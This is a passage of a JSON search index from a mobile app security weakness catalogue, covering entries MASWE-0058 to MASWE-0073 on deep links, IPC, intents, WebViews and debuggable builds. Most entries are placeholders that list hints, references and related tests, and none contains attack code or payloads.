weakness.</p>","tags":["android","L1","L2","maswe","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0058/","title":"MASWE-0058: Insecure Deep Links","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0058</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0058/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. use of URL Custom Schemes, unverified AppLinks/Universal Links, not validating URLs. Deep Link parameters offers a wide range of possibilities. A malformed URI or parameter value, if not sanitized, may trigger an injection in different points of the application. For example, CWE-939 prevents the exploit of the URI checking the source and CWE-917 prevents the exploit of the URI checking the content.</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0058/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>URL Custom Schemes</li> <li>AppLinks</li> <li>Universal Links</li> <li>URL validation</li> <li>Check for OS version. e.g. deep link are more secure after Android XX</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0058/#references","title":"References","text":"<ul> <li>https://developer.apple.com/documentation/technotes/tn3155-debugging-universal-links</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0058/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0028 - Testing Deep Links (android)</li> <li>MASTG-TEST-0075 - Testing Custom URL Schemes (ios)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0059/","title":"MASWE-0059: Use Of Unauthenticated Platform IPC","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0059</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0059/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. (ab)using the clipboard or using localhost server for IPC</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0059/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>(ab)using the clipboard</li> <li>using localhost server</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0059/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0060/","title":"MASWE-0060: Insecure Use of UIActivity","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0060</p>","tags":["ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0060/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. data (items) being shared, custom activities, excluded activity types. More examples include CWE-285 and CWE-200 for exposing UIActivity information to untrusted apps or actors. CWE-358 for possible bad activityViewController implemented in the UIActivity.</p>","tags":["ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0060/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>data (items) being shared</li> <li>custom activities</li> <li>excluded activity types</li> </ul>","tags":["ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0060/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0061/","title":"MASWE-0061: Insecure Use of App Extensions","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0061</p>","tags":["ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0061/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>restricting use of certain extensions</p>","tags":["ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0061/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>restricting use of certain extensions via <code>application:shouldAllowExtensionPointIdentifier:</code></li> <li>Third-Party Keyboards Not Disabled via UIApplicationKeyboardExtensionPointIdentifier</li> </ul>","tags":["ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0061/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["ios","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0062/","title":"MASWE-0062: Insecure Services","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0062</p>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0062/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Unintentionally exported services, unrestricted permissions. Exposed binders e.g not using checkCallingPermission() to verify whether the caller has a required permission.</p>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0062/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Services</li> <li>Exposed Binders via Exported Services</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0062/#references","title":"References","text":"<ul> <li>https://developer.android.com/privacy-and-security/security-tips#Services</li> <li>https://developer.android.com/guide/topics/manifest/service-element</li> <li>https://developer.android.com/reference/android/app/Service</li> <li>https://developer.android.com/privacy-and-security/security-tips#binder-and-messenger-interfaces</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0062/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0030 - Testing for Vulnerable Implementation of PendingIntent (android)</li> <li>MASTG-TEST-0029 - Testing for Sensitive Functionality Exposure Through IPC (android)</li> <li>MASTG-TEST-0072 - Testing App Extensions (ios)</li> <li>MASTG-TEST-0071 - Testing UIActivity Sharing (ios)</li> <li>MASTG-TEST-0070 - Testing Universal Links (ios)</li> <li>MASTG-TEST-0073 - Testing UIPasteboard (ios)</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0063/","title":"MASWE-0063: Insecure Broadcast Receivers","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0063</p>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0063/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Unintentionally exported broadcast receivers, unrestricted permissions, sticky broadcasts.</p>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0063/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Unintentionally exported broadcast receivers</li> <li>Unrestricted permissions</li> <li>Sticky broadcasts</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0063/#references","title":"References","text":"<ul> <li>https://developer.android.com/guide/components/broadcasts#security-and-best-practices</li> <li>https://developer.android.com/topic/security/risks/sticky-broadcast</li> <li>https://developer.android.com/privacy-and-security/security-tips#BroadcastReceivers</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0063/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0030 - Testing for Vulnerable Implementation of PendingIntent (android)</li> <li>MASTG-TEST-0029 - Testing for Sensitive Functionality Exposure Through IPC (android)</li> <li>MASTG-TEST-0072 - Testing App Extensions (ios)</li> <li>MASTG-TEST-0071 - Testing UIActivity Sharing (ios)</li> <li>MASTG-TEST-0070 - Testing Universal Links (ios)</li> <li>MASTG-TEST-0073 - Testing UIPasteboard (ios)</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0064/","title":"MASWE-0064: Insecure Content Providers","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0064</p>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0064/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Unintentionally exported content providers, unprotected content providers, permission tags, protection level</p>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0064/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>file-system based</li> <li>FileProvider (Android)</li> <li>database based</li> <li>exposed</li> <li>permission tags</li> <li>protection level</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0064/#references","title":"References","text":"<ul> <li>https://developer.android.com/topic/security/risks/content-resolver</li> <li>https://developer.android.com/reference/androidx/core/content/FileProvider</li> <li>https://developer.android.com/topic/security/risks/file-providers</li> <li>https://developer.android.com/privacy-and-security/security-tips#ContentProviders</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0064/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0007 - Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms (android)</li> <li>MASTG-TEST-0056 - Determining Whether Sensitive Data Is Exposed via IPC Mechanisms (ios)</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0065/","title":"MASWE-0065: Sensitive Data Permanently Shared with Other Apps","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0065</p>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0065/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Provide clients one-time access to data. For example using URI permission grant flags and content provider permissions to display an app's PDF file in a separate PDF Viewer app.</p>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0065/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>content providers</li> <li>FLAG_GRANT_READ_URI_PERMISSION</li> <li>FLAG_GRANT_WRITE_URI_PERMISSION</li> <li>FLAG_GRANT_PERSISTABLE</li> <li>content URIs</li> <li>file URIs</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0065/#references","title":"References","text":"<ul> <li>https://developer.android.com/topic/security/risks/content-resolver</li> <li>https://developer.android.com/reference/androidx/core/content/FileProvider</li> <li>https://developer.android.com/topic/security/risks/file-providers</li> <li>https://developer.android.com/privacy-and-security/security-tips#ContentProviders</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0065/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0007 - Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms (android)</li> <li>MASTG-TEST-0056 - Determining Whether Sensitive Data Is Exposed via IPC Mechanisms (ios)</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0066/","title":"MASWE-0066: Insecure Intents","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0066</p>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0066/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. calling startActivity, startService, sendBroadcast, or setResult on untrusted Intents without validating or sanitizing these Intents. Using an implicit intent to start a service is a security hazard, because you can't be certain what service will respond to the intent and the user can't see which service starts. e.g. mutable pending intents (not using FLAG_IMMUTABLE), replaying pending intents (not using FLAG_ONE_SHOT)</p>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0066/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Insecure Intent Redirection</li> <li>Insecure Implicit Intents</li> <li>Insecure Pending Intents (Mutable, Replaying)</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0066/#references","title":"References","text":"<ul> <li>https://support.google.com/faqs/answer/9267555?hl=en</li> <li>https://developer.android.com/privacy-and-security/security-tips#intents</li> <li>https://developer.android.com/topic/security/risks/intent-redirection</li> <li>https://developer.android.com/topic/security/risks/implicit-intent-hijacking</li> <li>https://developer.android.com/topic/security/risks/pending-intent</li> </ul>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0066/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","L1","L2","maswe","masvs-platform-1","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0067/","title":"MASWE-0067: Debuggable Flag Not Disabled","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","R","maswe","masvs-resilience-4"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0067/#overview","title":"Overview","text":"<p>Mobile apps typically include a configuration flag that determines whether the app is debuggable. While this flag is essential during development, leaving it enabled in production can introduce serious security risks. A debuggable app allows attackers to attach debuggers, inspect memory, manipulate execution flow, and bypass client-side controls, even on non-rooted or non-jailbroken devices. It may also expose sensitive information through verbose logging or developer tools that would otherwise be inaccessible.</p>","tags":["android","ios","R","maswe","masvs-resilience-4"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0067/#impact","title":"Impact","text":"<ul> <li>Read and Modify Memory: Attackers can read and modify the app's memory space, which can lead to the exposure of sensitive information, such as encryption keys, API keys, user credentials, or tokens that otherwise would be inaccessible since they aren't present in the app's code or stored to disk.</li> <li>Bypassing Security Controls: Attackers can bypass security controls, such as authentication and authorization mechanisms, by manipulating the app's execution flow.</li> <li>Execute Unauthorized Code: Attackers can inject and execute arbitrary code within the app's context, leading to further exploitation of the device or the app's data. For example, attackers can inject reverse engineering tools like Frida into the app even on non-rooted or non-jailbroken devices.</li> <li>Access to Sensitive Logs: Attackers can access logs that may contain sensitive information, such as user credentials, API keys, or other sensitive data that would otherwise be inaccessible. This can lead to further exploitation of the app or the device.</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-4"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0067/#mode-of-introduction","title":"Mode of Introduction","text":"<ul> <li>Misconfigured Build Settings: Misconfigured build settings can accidentally leave an app in a state that is debuggable, exposing it to security vulnerabilities. This can result from improper selection of build variants, errors in CI/CD configurations, or mistakenly applying debug settings to production environments.</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-4"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0067/#mitigations","title":"Mitigations","text":"<ul> <li>Ensure that the debuggable flag in the app's configuration file is not enabled for production builds. For example, by using build variants or flavours to separate debug and release configurations, ensure that the debuggable flag is enabled only for debug builds.</li> </ul>","tags":["android","ios","R","maswe","masvs-resilience-4"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0067/#tests","title":"Tests","text":"<p> MASTG-TEST-0227: Debugging Enabled for WebViews  MASTG-TEST-0226: Debuggable Flag Enabled in the AndroidManifest  MASTG-TEST-0261: Debuggable Entitlement Enabled in the entitlements.plist </p>","tags":["android","ios","R","maswe","masvs-resilience-4"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0068/","title":"MASWE-0068: JavaScript Bridges in WebViews","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0068</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0068/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>via addJavascriptInterface</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0068/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>addJavascriptInterface</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0068/#references","title":"References","text":"<ul> <li>https://support.google.com/faqs/answer/9095419</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0068/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0033 - Testing for Java Objects Exposed Through WebViews (android)</li> <li>MASTG-TEST-0078 - Determining Whether Native Methods Are Exposed Through WebViews (ios)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0069/","title":"MASWE-0069: WebViews Allows Access to Local Resources","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0069</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0069/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>use of setAllowFileAccessFromFileURLs. Mitigations include setAllowFileAccess(false), setAllowContentAccess(false)</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0069/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>universal file access</li> <li>restrict content access</li> <li>handlers e.g. file:// vs content://</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0069/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0032 - Testing WebView Protocol Handlers (android)</li> <li>MASTG-TEST-0077 - Testing WebView Protocol Handlers (ios)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0069/#tests","title":"Tests","text":"<p> MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews  MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews  MASTG-TEST-0252: References to Local File Access in WebViews  MASTG-TEST-0250: References to Content Provider Access in WebViews </p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-storage-2","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0070/","title":"MASWE-0070: JavaScript Loaded from Untrusted Sources","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0070</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0070/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. not validating the source of the JavaScript code</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0070/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0071/","title":"MASWE-0071: WebViews Loading Content from Untrusted Sources","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0071</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0071/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>WebView objects shouldn't load URLs from untrusted sources. Also, your app shouldn't let users navigate to sites that are outside of your control. Whenever possible, use an allowlist to restrict the content loaded by your app's WebView objects e.g. via WebViewClient.shouldOverrideUrlLoading</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0071/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>not restricting navigation</li> <li>not using SafeBrowsing</li> <li>loading URL from untrusted sources e.g. intents or deep links</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0071/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0072/","title":"MASWE-0072: Universal XSS","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0072</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0072/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Successful exploitation of this vulnerability may allow a remote attacker to steal potentially sensitive information, change appearance of a web page, perform phishing and drive-by-download attacks.</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0072/#references","title":"References","text":"<ul> <li>https://hackerone.com/reports/532836</li> <li>https://www.cybersecurity-help.cz/vdb/SB2021110227</li> <li>https://cwe.mitre.org/data/definitions/79.html</li> <li>https://blog.oversecured.com/Evernote-Universal-XSS-theft-of-all-cookies-from-all-sites-and-more/</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0072/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0073/","title":"MASWE-0073: Insecure WebResourceResponse Implementations","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0073</p>","tags":["android","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0073/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Using WebResourceResponse instead of WebViewAssetLoader</p>","tags":["android","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0073/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Since WebResourceResponse may serve attacker\u2011controlled HTML/JS, it enables XSS when content isn\u2019t properly sanitized (CWE-79).</li> <li>If an app exposes arbitrary files via XHR in the WebView context, it may be leaking private data (CWE-200).</li> <li>Data or files from a protected internal sphere (such as app-private storage) are exposed to a less trusted sphere, like WebView's JavaScript context or external websites (CWE-669).</li> </ul>","tags":["android","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0073/#references","title":"References","text":"<ul> <li>https://blog.oversecured.com/Android-Exploring-vulnerabilities-in-WebResourceResponse/</li> </ul>","tags":["android","L2","maswe","masvs-platform-2","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-PLATFORM/MASWE-0073/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this 